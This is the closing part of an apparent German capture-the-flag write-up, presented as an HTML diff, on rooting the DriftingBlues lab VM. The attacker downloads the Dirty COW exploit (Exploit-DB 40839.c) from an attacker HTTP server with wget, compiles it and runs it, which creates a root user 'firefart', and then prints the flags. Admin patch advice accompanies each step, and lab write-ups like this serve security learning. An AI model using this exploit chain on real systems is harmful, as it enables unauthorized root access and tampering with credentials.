+                <strong>Bewertung:</strong> Voller Erfolg bei der Identifizierung eines hochkritischen Kernel-Exploits! Der Dirty COW Exploit ermöglicht eine lokale Rechteausweitung auf anfälligen Kernel-Versionen. Da die installierte Version 3.2.0-4 ist, ist das System definitiv anfällig. Dies ist ein sehr zuverlässiger Weg, um Root-Zugriff zu erlangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wähle einen der Dirty COW Exploits für Linux Kernel < 3.9 aus Exploit-DB (z.B. eine C-Variante wie 40839.c). Übertrage den Quellcode auf das Zielsystem, kompiliere ihn dort (da `gcc` vorhanden ist) und führe den Exploit aus.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere den System-Kernel umgehend auf eine Version, die nicht von CVE-2016-5195 betroffen ist. Dies ist die kritischste Schwachstelle.
+            </p>
+
+             <p>
+                 Ich habe den Quellcode für einen bekannten Dirty COW Exploit (Exploit-DB ID 40839.c) auf mein Angreifersystem kopiert, dann auf das Zielsystem übertragen und dort kompiliert und ausgeführt.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">cp /usr/share/exploitdb/exploits/linux/local/40839.<span class="command">c</span> /r<span class="command">oot</span>/dirty.<span class="command">c</span></span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">wget http://192.168.2.199:8000/dirty.<span class="command">c</span></span>
+--<span class="command">2025-06-21 17:36:43</span>--  http://192.168.2.199:8000/dirty.<span class="command">c</span>
+C<span class="command">onnecting</span> to <span class="command">192.168.2.199:8000</span>... c<span class="command">onnected</span>.
+HTTP request sent, awaiting resp<span class="command">onse</span>... <span class="password">200 OK</span>
+Length: <span class="command">4814 (4.7K) [text/x-csrc]</span>
+Saving to: `dirty.c&apos;
+
+<span class="command">100%[====================================================&gt;] 4,814       --.-K/s   in 0s      </span>
+
+<span class="command">2025-06-21 17:36:43 (1.24 GB/s) - `dirty.c&apos; saved [4814/4814]</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">gcc dirty.c -o pwn -pthread -lcrypt</span>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">./pwn</span>
+<span class="command">/etc/<span class="command">password</span> successfully backed up to /tmp/<span class="command">password</span>.bak</span>
+<span class="command">Please enter the new <span class="command">password</span>: </span>
+<span class="password">Complete line:</span>
+<span class="password">firefart:firpw7c9cnW6o:0:0:pwned:/r<span class="command">oot</span>:/bin/bash</span>
+
+<span class="command">mmap: 7f918e133000</span>
+id
+su r<span class="command">oot</span>
+benni
+ls
+su firefart
+benni
+id
+bash
+id
+madvise 0
+
+ptrace 0
+<span class="command">D<span class="command">one</span>! Check /etc/<span class="command">password</span> to see if the new user was created.</span>
+<span class="command">You can l<span class="command">og</span> in with the username &apos;firefart&apos; and the <span class="command">password</span> &apos;benni&apos;.</span>
+
+
+<span class="command">D<span class="command">ON&apos;T FORGET TO REST<span class="command">ORE</span>! $ mv /tmp/<span class="command">password</span>.bak /etc/<span class="command">password</span></span>
+<span class="command">D<span class="command">one</span>! Check /etc/<span class="command">password</span> to see if the new user was created.</span>
+<span class="command">You can l<span class="command">og</span> in with the username &apos;firefart&apos; and the <span class="command">password</span> &apos;benni&apos;.</span>
+
+
+<span class="command">D<span class="command">ON&apos;T FORGET TO REST<span class="command">ORE</span>! $ mv /tmp/<span class="command">password</span>.bak /etc/<span class="command">password</span></span>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">id</span>
+<span class="password">uid=33(www-data) gid=33(www-data) gr<span class="command">oups=33(www-data)</span></span>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">su r<span class="command">oot</span></span>
+N<span class="command">o password entry for user &apos;root&apos;</span>
+<span class="password">www-data@driftingblues:/tmp$</span> hackertest
+bash: benni: c<span class="command">ommand</span> not f<span class="command">ound</span>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">ls</span>
+dirty.<span class="command">c</span>  eximhacker.sh	<span class="command">password</span>.bak  pwn  r<span class="command">oot.pm</span>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">su firefart</span>
+<span class="command">Password: <span class="password">benni</span></span>
+<span class="password">firefart@driftingblues:/tmp#</span> <span class="command">id</span>
+<span class="password">uid=0(firefart) gid=0(r<span class="command">oot</span>) gr<span class="command">oups=0(r<span class="command">oot</span>)</span></span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den C-Quellcode des Dirty COW Exploits (Exploit-DB 40839.c) lokal gespeichert (`dirty.c`), ihn über meinen HTTP-Server bereitgestellt und auf das Zielsystem in `/tmp/` mit `wget` als `www-data` heruntergeladen. Da `gcc` auf dem Zielsystem verfügbar war (`which gcc`), habe ich das Skript direkt dort kompiliert: `gcc dirty.c -o pwn -pthread -lcrypt`. Dies erstellt ein ausführbares Binary namens `pwn`. Ich habe das Binary ausgeführt (`./pwn`). Der Exploit überschreibt die `/etc/passwd` Datei im Speicher, um einen neuen Benutzer (`firefart`) mit UID und GID 0 (Root-Rechten) und einem von mir gewählten Passwort (`benni`) hinzuzufügen. Das Skript fordert zur Eingabe des neuen Passworts auf (`Please enter the new password:`). Ich habe `benni` eingegeben. Der Exploit meldet dann "Done! Check /etc/passwd to see if the new user was created. You can log in with the username 'firefart' and the password 'benni'." Es wurde auch ein Backup von `/etc/passwd` unter `/tmp/passwd.bak` erstellt. Ich versuchte, mich mit `su firefart` und dem Passwort `benni` anzumelden. Die Authentifizierung war erfolgreich und ich erhielt eine Root-Shell (`#`). Der Befehl `id` bestätigte: `<span class="password">uid=0(firefart) gid=0(root) groups=0(root)</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Dirty COW Kernel Exploit war erfolgreich und ich habe Root-Zugriff auf das Zielsystem erlangt. Diese kritische Kernel-Schwachstelle erlaubte es mir, die `/etc/passwd` Datei im Page Cache zu modifizieren und einen neuen Root-Benutzer hinzuzufügen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Sammle die Root- und User-Flags. Führe notwendige Bereinigungsschritte durch: Lösche den Exploit (dirty.c, pwn), das Backup (`/tmp/passwd.bak`) und den hinzugefügten Benutzer (`firefart`) aus `/etc/passwd`.
+                <br><strong>Empfehlung (Admin):</strong> **Sofortige Maßnahme:** Aktualisiere den System-Kernel umgehend auf eine Version, die nicht von CVE-2016-5195 betroffen ist. Führe eine Überprüfung der Benutzer in `/etc/passwd` durch und entferne unbekannte Root-Benutzer. Implementiere ein robustes Patch-Management für das gesamte System.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command"># cat /home/darkenergy/userFlag.txt</div>
+                    <div class="flag-value"><span class="password">4811162d4b5326c7432d29429ca6491b</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command"># cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">CCAD89B795EE7BCF7BBAD5A46F40F488</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 21. Juni 2025</p>
+    </footer>
+
+    <!-- Anmerkungen zu Bildnamen (falls zutreffend). Dieser Block wird nur hinzugefügt, wenn Bilder im Text gefunden und verarbeitet wurden. -->
+
+</body>
+</html>
